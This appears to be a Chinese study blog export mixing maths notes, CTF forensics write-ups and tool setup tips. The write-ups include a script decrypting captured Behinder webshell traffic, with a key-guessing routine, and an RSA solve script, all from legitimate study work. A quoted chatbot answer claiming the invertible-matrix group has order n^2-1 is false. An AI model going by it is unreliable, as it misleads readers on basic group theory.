<td align="left">上&#x2F;下午</td>
<td align="left">AM, PM，例如：PM</td>
</tr>
<tr>
<td align="left">%M</td>
<td align="left">分钟</td>
<td align="left">00 ~ 59，例如：26</td>
</tr>
<tr>
<td align="left">%S</td>
<td align="left">秒</td>
<td align="left">00 ~ 59，例如：26</td>
</tr>
</tbody></table>
<h2 id="计时"><a href="#计时" class="headerlink" title="计时"></a>计时</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sleep(secs)</td>
<td align="left">暂停执行调用线程达到给定的秒数。参数可以是浮点数，以指示更精确的睡眠时间。实际的暂停时间可能小于请求的时间，因为任何捕获的信号将在执行该信号的捕获例程后终止 sleep() 。此外，由于系统中其他活动的安排，暂停时间可能比请求的时间长任意量。</td>
</tr>
<tr>
<td align="left">monotonic()</td>
<td align="left">返回单调时钟的值（以小数秒为单位），即不能倒退的时钟。时钟不受系统时钟更新的影响。返回值的参考点未定义，因此只有连续调用结果之间的差异才有效。</td>
</tr>
<tr>
<td align="left">perf_counter()</td>
<td align="left">返回性能计数器的值（以小数秒为单位），即具有最高可用分辨率的时钟，以测量短持续时间。它确实包括睡眠期间经过的时间，并且是系统范围的。返回值的参考点未定义，因此只有连续调用结果之间的差异才有效。</td>
</tr>
</tbody></table>
<h2 id="Pell方程与RSA"><a href="#Pell方程与RSA" class="headerlink" title="Pell方程与RSA"></a>Pell方程与RSA</h2><blockquote>
<p><a href="https://hasegawaazusa.github.io/pell-equation-group-note.html">pell方程与群的笔记 | 独奏の小屋 (hasegawaazusa.github.io)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/524443454">同构映射的性质 - 知乎 (zhihu.com)</a></p>
</blockquote>
<p><strong>定义1</strong> 设 $V$ 与 $V’$ 都是域 $F$ 上的线性空间，如果存在 $V$ 到 $V’$ 的一个双射 $\sigma$ ，并且 $\sigma$ 保持加法与纯量乘法两种运算，即使对于任意 $\alpha, \beta\in V$,  $k \in F$，有：<br>$$<br>\sigma (\alpha + \beta) &#x3D; \sigma(\alpha) + \sigma(\beta),\<br>\sigma (k\alpha) &#x3D; k\sigma (\alpha)<br>$$<br>那么称 $\sigma$ 是 $V$ 到 $V’$ 的一个同构映射（简称为同构）；此时称 $V$ 与 $V’$ 是同构的，记作 $V \cong V’$。</p>
<p>从定义可以看出，如果域 $F$ 上的两个线性空间 $V$ 与 $V’$ 是同构的，那么 $V$ 与 $V’$ 的元素之间存在一一对应：$\alpha \longmapsto \sigma(\alpha)$；并且这个映射 $\sigma$ 保持加法与纯量乘法两种运算，由此可以推导出 $\sigma$ 具有下列性质：</p>
<ul>
<li><strong>性质1</strong> $\sigma(0)$ 是 $V’$ 的零元。</li>
<li><strong>性质2</strong> $V$ 中的向量组 $\alpha_1, \alpha_2, \alpha_3, \cdots, \alpha_s$ 线性相关（无关），当且仅当 $\sigma(\alpha_1), \sigma(\alpha_2), \cdots, \sigma(\alpha_s)$ 是 $V’$ 中的线性相关（无关）组。</li>
<li><strong>性质3</strong> 如果 $\alpha_1, \alpha_2, \alpha_3, \cdots, \alpha_n$ 是 $V$ 的一个基， 那么 $\sigma(\alpha_1), \sigma(\alpha_2), \cdots, \sigma(\alpha_n)$ 是 $V’$ 的一个基。</li>
<li><strong>性质4</strong> 如果 $U$ 是 $V$ 的一个子空间，那么 $\sigma(U)$ 也是 $V’$ 的一个子空间，如果 $U$ 是有限维的，那么 $\sigma(U)$ 也是有限维的，并且$dim_{\sigma_{(U)}} &#x3D; dim_{U}$</li>
</ul>
<p><strong>判定：</strong></p>
<ul>
<li><strong>定理1</strong> 域$F$上两个有限维的线性空间同构的充分必要条件是它们的维数相同。</li>
</ul>
<h3 id="Pell方程"><a href="#Pell方程" class="headerlink" title="Pell方程"></a>Pell方程</h3><p><strong>定义</strong> 形如 $x^{2} - Dy^{2} &#x3D; 1$ 的二元二次方程，其中D为正整数。</p>
<p>对模 $n$ 的Pell方程，我们有：<br>$$<br>x^{2} - Dy^{2} \equiv 1 \mod n<br>$$<br>构成该方程的元素，称为群。</p>
<p>根据Pell方程的性质，有<strong>元素加法</strong>：<br>$$<br>(x_3, y_3) &#x3D; (x_1, y_1) \oplus (x_2, y_2) &#x3D; (x_1x_2 + Dy_1y_2, x_1y_2 + x_2y_1)<br>$$<br>存在<strong>数乘</strong>：</p>
<p>$e \otimes (x, y) &#x3D; (x, y) \oplus (x, y) \oplus \cdots \oplus(x, y)$</p>
<h1 id="230914"><a href="#230914" class="headerlink" title="230914"></a>230914</h1><h2 id="encoded"><a href="#encoded" class="headerlink" title="encoded"></a>encoded</h2><p>Salted__了解一下，这个是通过openssl加密如果不带base64就会出现Salted字段打头。再看base64的前几个字段U2Fsd确定是AES加密无误</p>
<h2 id="AreYouOK-Pro"><a href="#AreYouOK-Pro" class="headerlink" title="AreYouOK_Pro"></a>AreYouOK_Pro</h2><ul>
<li><p>修改文件后缀名，修改为<code>.pcap</code></p>
</li>
<li><p>协议查看，存在<code>RFCOMM</code>，wireshark筛选为<code>btrfcomm</code></p>
</li>
<li><p>968之后的数据包存在文件传输，利用<code>btrfcomm &amp;&amp; data &amp;&amp; frame.number &gt;= 968</code>进行筛选</p>
</li>
<li><p>将这些数据包导出为json，提取其中data段信息并扔掉报文头后，发现内容为一张图片，保存出来</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">packets = json.loads(<span class="built_in">open</span>(<span class="string">&quot;1.json&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    data += packet[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;data&quot;</span>][<span class="string">&quot;data.data&quot;</span>].replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">data = data.split(<span class="string">&quot;a5a50100&quot;</span>)</span><br><span class="line">newdata = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    newdata += x[<span class="number">8</span>:]</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;111.png&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(newdata[<span class="number">24</span>:].decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li>保存后打不开，可能存在冗余信息，直接通过<code>foremost</code>把里面的图片提取出来，得到：</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230914192029010.png" class="" title="image-20230914192029010">

<h2 id="Beyond"><a href="#Beyond" class="headerlink" title="Beyond"></a>Beyond</h2><img src="/2023/12/31/WeeklyStudy/image-20230914192825968.png" class="" title="image-20230914192825968">

<p>标明ICMP存活。</p>
<p><em>数据包表示向目标主机发送了一个ICMP Echo Request消息，查看相应数据包的信息来判断主机是否存活。如果有相应的ICMP Echo Reply数据包作为响应，则表明目标主机是存活的。</em></p>
<p>使用<code>http &amp;&amp; http.response.code == 200</code>进行筛选，再对其进行排序，查看相对特殊的长度，比如最长长度，追踪http流。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230914193250352.png" class="" title="image-20230914193250352">

<p>分析（官方wp），为冰蝎V4.0流量，服务端为PHP，使用默认的AES算法。</p>
<p>进行解密。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    c = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decodebs = base64.b64decode(data)</span><br><span class="line">    <span class="keyword">return</span> c.decrypt(decodebs)</span><br><span class="line"><span class="comment"># def Key_Brute(data):</span></span><br><span class="line"><span class="comment"># with open(&#x27;top500.txt&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="comment"># plain = [i.strip() for i in f.readlines()]</span></span><br><span class="line"><span class="comment"># for i in plain:</span></span><br><span class="line"><span class="comment"># md5_enc = hashlib.md5(i).hexdigest()</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment"># key = md5_enc[:16].encode()</span></span><br><span class="line"><span class="comment"># AES_dec = Decrypt(key, data).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="comment"># cmd = re.findall(r&#x27;[sS]$cmd=&quot;(.*?)&quot;&#x27;, AES_dec)</span></span><br><span class="line"><span class="comment"># if cmd:</span></span><br><span class="line"><span class="comment"># print(&#x27;[*] Crack Success!!!&#x27; + &#x27;n&#x27; + &#x27;[*] Key: &#x27; + i.decode(&#x27;utf-8&#x27;) + &#x27;n[*] Webshell Key: &#x27; + md5_enc[:16])</span></span><br><span class="line"><span class="comment"># payload = base64.b64decode(cmd[0]).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="comment"># print(&#x27;[*] Payload: &#x27; + payload)</span></span><br><span class="line"><span class="comment"># break</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment"># print(&#x27;[-] Crack Failed&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">    md5_enc = hashlib.md5(<span class="string">b&#x27;hunting&#x27;</span>).hexdigest()</span><br><span class="line">    key = md5_enc[:<span class="number">16</span>].encode()</span><br><span class="line">    AES_dec = Decrypt(key, data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_dec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>230流解密后，存在cmd等信息</p>
<img src="/2023/12/31/WeeklyStudy/image-20230914194115441.png" class="" title="image-20230914194115441">

<h1 id="231019"><a href="#231019" class="headerlink" title="231019"></a>231019</h1><h2 id="CryptoCTF2023"><a href="#CryptoCTF2023" class="headerlink" title="CryptoCTF2023"></a>CryptoCTF2023</h2><blockquote>
<p>reference: </p>
<ul>
<li><a href="https://blog.csdn.net/luochen2436/article/details/131702220?spm=1001.2014.3001.5502">2023 CCTF — writeup-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/m0_63321019/article/details/131797464">2023 CryptoCTF wp by lingfeng (easy分类)-CSDN博客</a></li>
</ul>
</blockquote>
<p>一点新东西进行概括。</p>
<h3 id="调用factordb-com的api接口，进行爆破。"><a href="#调用factordb-com的api接口，进行爆破。" class="headerlink" title="调用factordb.com的api接口，进行爆破。"></a>调用<code>factordb.com</code>的api接口，进行爆破。</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">PKEY = <span class="number">55208723145458976481271800608918815438075571763947979755496510859604544396672</span></span><br><span class="line">ENC = <span class="number">127194641882350916936065994389482700479720132804140137082316257506737630761</span></span><br><span class="line">c_high = ENC&lt;&lt;<span class="number">8</span></span><br><span class="line">n_high = (PKEY&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">8</span></span><br><span class="line">e_high = (PKEY &amp; (<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor_n</span>(<span class="params">n</span>):</span><br><span class="line">    url = <span class="string">&quot;http://factordb.com/api?query=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(n))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        fac = response.json()[<span class="string">&#x27;factors&#x27;</span>]</span><br><span class="line">        fac_data = [<span class="built_in">int</span>(i[<span class="number">0</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> fac]</span><br><span class="line">        <span class="keyword">return</span> fac_data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">p_q = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    n = n_high+i</span><br><span class="line">    fac_data = factor_n(n)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fac_data)==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> fac_data[<span class="number">0</span>].bit_length()==<span class="number">128</span> <span class="keyword">and</span> fac_data[<span class="number">1</span>].bit_length()==<span class="number">128</span> <span class="keyword">and</span> isPrime(fac_data[<span class="number">0</span>]) <span class="keyword">and</span> isPrime(fac_data[<span class="number">1</span>]):</span><br><span class="line">            p_q = fac_data</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p,q = <span class="built_in">int</span>(fac_data[<span class="number">0</span>]),<span class="built_in">int</span>(fac_data[<span class="number">1</span>])</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">        c = c_high + i</span><br><span class="line">        e = e_high + j</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                d = gmpy2.invert(e, phi)</span><br><span class="line">                m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">                flag = long_to_bytes(m)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(k&lt;=<span class="number">127</span> <span class="keyword">and</span> k &gt;=<span class="number">33</span> <span class="keyword">for</span> k <span class="keyword">in</span> flag):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">b&quot;CCTF&#123;&quot;</span>+flag+<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Risk"><a href="#Risk" class="headerlink" title="Risk"></a>Risk</h3><p>构造方程，以及进行约束求解$a, b$从而计算出$p, q$。</p>
<h1 id="231020"><a href="#231020" class="headerlink" title="231020"></a>231020</h1><h2 id="SCYD数据安全"><a href="#SCYD数据安全" class="headerlink" title="SCYD数据安全"></a>SCYD数据安全</h2><h3 id="Baby-TCP"><a href="#Baby-TCP" class="headerlink" title="Baby_TCP"></a>Baby_TCP</h3><p><a href="https://github.com/lclevy/firepwd">GitHub - lclevy&#x2F;firepwd: firepwd.py, an open source tool</a></p>
<h1 id="231121"><a href="#231121" class="headerlink" title="231121"></a>231121</h1><h2 id="卷积概念"><a href="#卷积概念" class="headerlink" title="卷积概念"></a>卷积概念</h2><img src="/2023/12/31/WeeklyStudy/image-20231121183714832.png" class="" title="image-20231121183714832">

<img src="/2023/12/31/WeeklyStudy/v2-ed62c7d0e5ba9e6c602f7673435ae846_r.jpg" class="" title="img">

<h1 id="231213"><a href="#231213" class="headerlink" title="231213"></a>231213</h1><h2 id="conda报错"><a href="#conda报错" class="headerlink" title="conda报错"></a>conda报错</h2><blockquote>
<p>Invalid version spec: &#x3D;2. 7</p>
</blockquote>
<p><code>conda</code>报错，原因是版本老了，可以创建一个python高版本虚拟环境。</p>
<ul>
<li><p>创建虚拟环境：<code>conda create -n [xxx] python=3.x conda=4.9.2</code></p>
</li>
<li><p>激活虚拟环境：<code>conda activate  [xxx]</code></p>
</li>
<li><p>休眠虚拟环境：<code>conda deactivate  [xxx]</code></p>
</li>
<li><p>虚拟环境罗列：<code>conda info --envs</code> 或者 <code>conda info -e</code> 或者 <code>conda env list</code></p>
</li>
<li><p>删除虚拟环境：<code>conda remove --name [xxx] --all</code></p>
</li>
<li><p>罗列虚拟环境安装的库：<code>conda list</code></p>
</li>
</ul>
<p>更换镜像源：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes </span><br></pre></td></tr></table></figure>

<h1 id="231214"><a href="#231214" class="headerlink" title="231214"></a>231214</h1><h2 id="宸极-231214——-GL-n-fp-群阶的题目类型研究。"><a href="#宸极-231214——-GL-n-fp-群阶的题目类型研究。" class="headerlink" title="宸极_231214——$GL(n,fp)$群阶的题目类型研究。"></a>宸极_231214——$GL(n,fp)$群阶的题目类型研究。</h2><img src="/2023/12/31/WeeklyStudy/image-20231214171348882.png" class="" title="image-20231214171348882">

<img src="/2023/12/31/WeeklyStudy/image-20231214181343635.png" class="" title="image-20231214181343635">

<blockquote>
<p>问OpenAI 3.5</p>
</blockquote>
<p>一个非奇异矩阵（即可逆矩阵）的群的阶可以通过其矩阵的维度来确定。对于 n 阶矩阵，其群的阶为 $n^2 - 1$。</p>
<p>这是因为对于一个非奇异矩阵 A，它可以表示为 $A &#x3D; PDP^(-1)$，其中 D 为对角矩阵，P 是可逆矩阵。由于 P 是可逆的，它属于 $n×n$ 可逆矩阵的集合，这个集合的阶为 $n^2$。而对角矩阵 D 的对角线上有 $n$ 个非零元素，因此 D 的阶是 $n$。所以可逆矩阵的群的阶为 $n^2 - 1$。</p>
<p>因此，对于一个非奇异矩阵的群的阶是 $n^2 - 1$，其中 $n$ 为矩阵的维度。</p>
<h1 id="231215"><a href="#231215" class="headerlink" title="231215"></a>231215</h1><h2 id="安装Tesseract-OCR"><a href="#安装Tesseract-OCR" class="headerlink" title="安装Tesseract-OCR"></a>安装Tesseract-OCR</h2><ol>
<li>单独的pytesseract包是无法运行的，需要下载Tesseract-OCR</li>
<li>下载链接：<a href="https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-setup-4.00.00dev.exe">https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-setup-4.00.00dev.exe</a></li>
<li>安装：按照默认的安装就行，我这里将安装路径改为D:\Programe Files\Tesseract-OCR，默认是C:\Programe Files\Tesseract-OCR</li>
<li>配置环境变量（这里配置的是系统变量）：<ol>
<li>新建变量：TESSDATA_PREFIX</li>
<li>路径，<code>Tesseract-OCR</code>的安装路径。</li>
</ol>
</li>
</ol>
<h1 id="231222"><a href="#231222" class="headerlink" title="231222"></a>231222</h1><h2 id="破解对称性的必备利器——群论"><a href="#破解对称性的必备利器——群论" class="headerlink" title="破解对称性的必备利器——群论"></a>破解对称性的必备利器——群论</h2><blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIyNjc2NzY4OA==&mid=2247485239&idx=1&sn=f013f3da01d2dc3afab04365ddc0d7cd&chksm=e86a2110df1da8065530d75de00c85485c3170a0b35bac7d574ee7a1927976294bfc431039d5&scene=21#wechat_redirect">破解对称性的必备利器——群论 (qq.com)</a></p>
</blockquote>
<h3 id="旋转对称性"><a href="#旋转对称性" class="headerlink" title="旋转对称性"></a>旋转对称性</h3><img src="/2023/12/31/WeeklyStudy/640.jpeg" class="" title="图片">

<p>不难看出，把上面的图案 a) （顺时针或逆时针）旋转 90 度的整数倍，它都能和自己重合；图像 b) 和 k) 要（顺时针或逆时针）旋转 72 度的整数倍也能和自己重合；图像 f) 和 g) 要特殊一些，必须（顺时针或逆时针）旋转 120 度的整数倍才能和自己重合。我们把图形的这种性质称为旋转对称性（Rotational symmetry）。</p>
<p>此外，虽然 a) 和 e) 都具有 π&#x2F;2（本文默认使用弧度制）整数倍的旋转对称性，但 e) 比 a) 更加厉害，因为如果把这两个图案沿水平或竖直方向翻折一下，e) 依然我行我素， a) 却已经迷失自我了。在这种情况下，我们称 e) 具有翻折对称性（Folding symmetry）。</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226581100-3.jpeg" class="" title="图片">

<p>除了旋转与翻折以外，还有平移对称性，以及更加深刻的洛伦兹（时空）对称性等等。</p>
<p>把所有的对称性都纳入囊中呢？在数学家眼里答案只有一个字——<strong>群</strong>（Group）。</p>
<p>所谓一个图案的对称群，就是把所有<strong>使得它保持不变的所有动作筛选出来，凑成一个集合</strong>。不难想象，一个对称群可以由某些最基本的动作不断组合而成，这些最“基本的动作”就是对称群的生成元。</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226659674-6.jpeg" class="" title="图片">

<p>二维旋转群（二阶正交矩阵群）： </p>
<img src="/2023/12/31/WeeklyStudy/640-1703227271206-15.png" class="" title="图片">

<p>的子群。</p>
<h3 id="群的定义"><a href="#群的定义" class="headerlink" title="群的定义"></a>群的定义</h3><blockquote>
<p>定义（群）：</p>
<p>一个群（G, ·）是由一个集合 G 和一个二元运算 · 构成的数学结构，满足：</p>
<p>封闭性：对于 G 中任意两个元素 a、b，a · b 也在 G 中；</p>
<p>结合律：对于 G 中任意两个元素 a、b、c，(a · b) · c &#x3D; a · (b · c);</p>
<p>单位元：存在一个“单位元” e，使得对 G 中任意元素 a： e · a &#x3D; a · e &#x3D; a；</p>
<p>可逆性：G 中任意元素 a 存在一个逆元 ɐ （这个记号就是把字母 ‘a’ 倒过来），使得 a · ɐ &#x3D; ɐ · a &#x3D; e.</p>
</blockquote>
<p>这里的二元运算 “·” 很像乘法，但不一定满足交换律。例如在旋转群例子中，先旋转再翻折和先翻折在旋转得到的效果不同！如果一个群面相良好，群“乘法”恰好满足交换律，那么这样的群称为交换群。</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226795012-9.jpeg" class="" title="图片">

<p>群的另一个例子对于有线性代数基础的读者都不陌生 —— 所有 N 阶非奇异（可逆）矩阵都能够组成一个群，而这个群的乘法就是矩阵乘法，因此这并不是交换群。数学家们把这个群称为 N 阶线性群，记作 GL(N,R) ，这里 R 表示实数全体</p>
<h4 id="应用1"><a href="#应用1" class="headerlink" title="应用1"></a>应用1</h4><p>例如 GL(N,R) 和 GL(N,C) 是<strong>连续群</strong>，包含了一大类李群（同时具有群和流形双重属性），和与之对应的李代数（李群上的切向量场，因李群具有群的特性也同时被赋予了代数性质）关系密切。由理论物理学中著名的<strong>诺特定理</strong>（Noether‘s Theorm），每种守恒的物理量（例如质量、动量、能量等）都对应一种对称性 [1,2]，于是线性群和李群便成为了理论物理学中强有力的工具。</p>
<h4 id="应用2"><a href="#应用2" class="headerlink" title="应用2"></a>应用2</h4><p>GL(N,Z) 和 GL(N,F_q) 都是<strong>离散群</strong>，性格和 GL(N,R) 、 GL(N,C) 两兄弟大不相同，它们被广泛地运用在数论研究中。例如 GL(N,Z) 和数论中著名的<strong>模形式</strong>（Modular Form）关系密切。简而言之，数论中的许多问题，尤其是与椭圆曲线有关的问题，可以通过研究<strong>椭圆函数</strong>（复数域上的双周期函数）来描述出来。椭圆函数属于复变函数，种类繁多，通过传统的分析方法研究并不容易；模形式是椭圆函数的一种简单表达方式，它们的对称群就是 GL(N,Z) 的一个<strong>子群</strong>（Subgroup，简要说来就是原群的一个子集合，并且这个自己和也是一个群）。</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226932612-12.jpeg" class="" title="图片">

<p>通过椭圆函数的对称群来研究椭圆函数本身，这种充满新意的想法为椭圆曲线的研究提供了全新的思路，并且同千禧年数学七大数学难题中的黎曼假设（黎曼zeta函数也是椭圆函数）和 BCS 猜想两个问题联系紧密。</p>
<p><strong>群正是破解对称性的利器。</strong></p>
<h1 id="231226"><a href="#231226" class="headerlink" title="231226"></a>231226</h1><ol>
<li>确定测评目标和范围：<ul>
<li>确定测评的整体目标，例如提升内容审核的准确性和高效性，确保用户发布的内容符合法规和平台规定。</li>
<li>确定测评的范围，包括审核规则、审核体系结构和使用的审核工具等。</li>
</ul>
</li>
<li>制定测评方案：<ul>
<li>规划测评的时间表和工作流程，确保测评工作能够顺利进行，并不影响平台的正常运营。</li>
<li>设计测评的方法和评估指标，用于对内容安全审核工作的实时监控、审核规则的调整、审核体系结构的设计等方面进行评估。</li>
</ul>
</li>
<li>组织实施测评工作：<ul>
<li>安排审核工作人员进行日常审核工作，并使用互联网信息审核工具进行实时监控，及时发现和处理问题。</li>
<li>收集审核工作数据和审核结果，包括审核通过率、误判率、审核的用户反馈等。</li>
</ul>
</li>
<li>使用互联网信息审核工具实时监控审核工作，调整审核规则：<ol>
<li>部署互联网信息审核工具，对用户生成的内容进行实时监控，包括文本、图片、视频等多种形式。</li>
<li>分析审核工作中发现的问题及用户投诉情况，以期间调整审核规则，包括敏感词库、涉黄涉暴涉政等规则的调整和优化。</li>
<li>追踪最新的网络热点事件和舆情动态，更新审核规则以应对突发事件和舆情风险。</li>
</ol>
</li>
<li>根据审核规则设计互联网信息审核体系结构，提出工作开发需求：<ol>
<li>根据审核规则设计审核流程和体系结构，确保审核工作的严谨性和持续性。包括责任人的职责和权限划分，审核流程的规范化和透明化。</li>
<li>对审核工作的技术和人员需求进行评估，提出包括硬件设备、软件工具、人员培训等工作需求并提出相应的技术推荐。</li>
</ol>
</li>
<li>根据工作汇总结果，调整内容关联拓展审核制度，调整互联网信息审核工具：<ol>
<li>对内容关联拓展的审核工作进行绩效评估，根据实际结果对关联拓展审核制度进行调整，优化审核策略，确保审核的全面性和准确性。</li>
<li>根据最新的审核规则和审核需求，对互联网信息审核工具进行更新和调整，确保工具的适应性和灵活性。</li>
<li>提出关于审核工具功能迭代和技术升级的工作开发需求，以适应不断变化的互联网内容特点和审核要求。</li>
</ol>
</li>
</ol>
<h1 id="231227-8"><a href="#231227-8" class="headerlink" title="231227-8"></a>231227-8</h1><p>Obsidian以及Zotero的使用。</p>
<p><strong>添加文献</strong>。添加文献条目的方式有很多，个人认为以doi号添加、浏览器插件为主，以剪贴板导入为辅。</p>
<p>(1)首先在网上查找到文献的doi号，然后通过doi号添加条目，zotero会搜索文献信息自动添加。</p>
<img src="/2023/12/31/WeeklyStudy/v2-3516606cbd7704ca97f766c4ff16f741_720w.webp" class="" title="img">

<p>通过doi号添加条目</p>
<p>(2)通过浏览器插件添加条目，需要借助zotero的官方浏览器插件，支持多种浏览器，可以在<a href="https://link.zhihu.com/?target=https://www.zotero.org/">zotero官网</a>直接安装，也是我添加参考文献的主要方式。安装插件后，当位于有文献信息的网页时，例如谷歌学术、知网或期刊网站等等，可以直接通过插件将当前文献保存在zotero，并且支持一次添加多篇文献。</p>
<img src="/2023/12/31/WeeklyStudy/v2-aa18d3eca5354163092aaba79dc145f4_720w.webp" class="" title="img">

<p>官网提供的浏览器插件，右侧下载对应版本</p>
<img src="/2023/12/31/WeeklyStudy/v2-8819c08381807e291c6d2877cc79e238_720w.webp" class="" title="img">

<p>使用浏览器插件添加条目</p>
<p>(3)通过剪贴板导入。上述两种方法基本可以应付大多文献，但对于一些特别古老的文献可能就没法识别，这是还可以通过剪贴板导入辅助添加。我们可以找到一篇文献的参考文献信息(或者自己手动整理)，然后复制到剪贴板，然后在zotero中选”文件”-&gt;”从剪贴板导入”或者按快捷键”Ctrl+Shift+Alt+I”来导入文献。</p>
<img src="/2023/12/31/WeeklyStudy/v2-e41ef0ebe02064298ce26e81dd7d2744_720w.webp" class="" title="img">

<p>从剪贴板导入条目</p>
<p>一般导入文献之后，并不能保证文献信息一定是正确的，还需要养成主动检查的习惯。</p>
]]></content>
      <categories>
        <category>Description</category>
      </categories>
      <tags>
        <tag>2023</tag>
      </tags>
  </entry>
  <entry>
    <title>Gimp安装-Vol一些用法</title>
    <url>/2024/12/05/gimp%E5%AE%89%E8%A3%85-vol%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>主要是一些kali中工具的安装，这些工具安装适用于<code>Kali-2024</code>版本。</p>
<p>中间有一个题目复现，主要涉及画图需要用<code>gimp</code>的场景。</p>
<span id="more"></span><!--toc-->
<h1>安装gimp</h1>
<blockquote>
<p><a href="https://www.gimp.org/">GIMP - GNU Image Manipulation Program</a><br>
<a href="https://www.gimp.org/downloads/">GIMP - Downloads</a></p>
</blockquote>
<p><em>还得是官方，比较可靠。</em></p>
<h2 id="安装flatpak">安装flatpak</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flatpak install https://flathub.org/repo/appstream/org.gimp.GIMP.flatpakref</span><br></pre></td></tr></table></figure>
<p>直接先进行安装，可能需要稳定网络。<br>
反正多试试，比docker拉取容易。<br>
安装<code>gimp</code>相关的环境，一般需要比较多的时间进行安装。<br>
一共是5/7个环境，需要花费一定时间，可能安装失败。</p>
<h2 id="运行flatpak">运行flatpak</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flatpak run org.gimp.GIMP//stable</span><br></pre></td></tr></table></figure>
<p>安装失败，直接重新安装即可。<br>
打开原始文件的2种方式。</p>
<ul>
<li>使用上面的命令之后，在图形化界面中打开<code>data</code>文件</li>
<li>或者直接使用<code>flatpak run org.gimp.GIMP//stable xxx.data</code></li>
</ul>
<h2 id="更新flatpak">更新flatpak</h2>
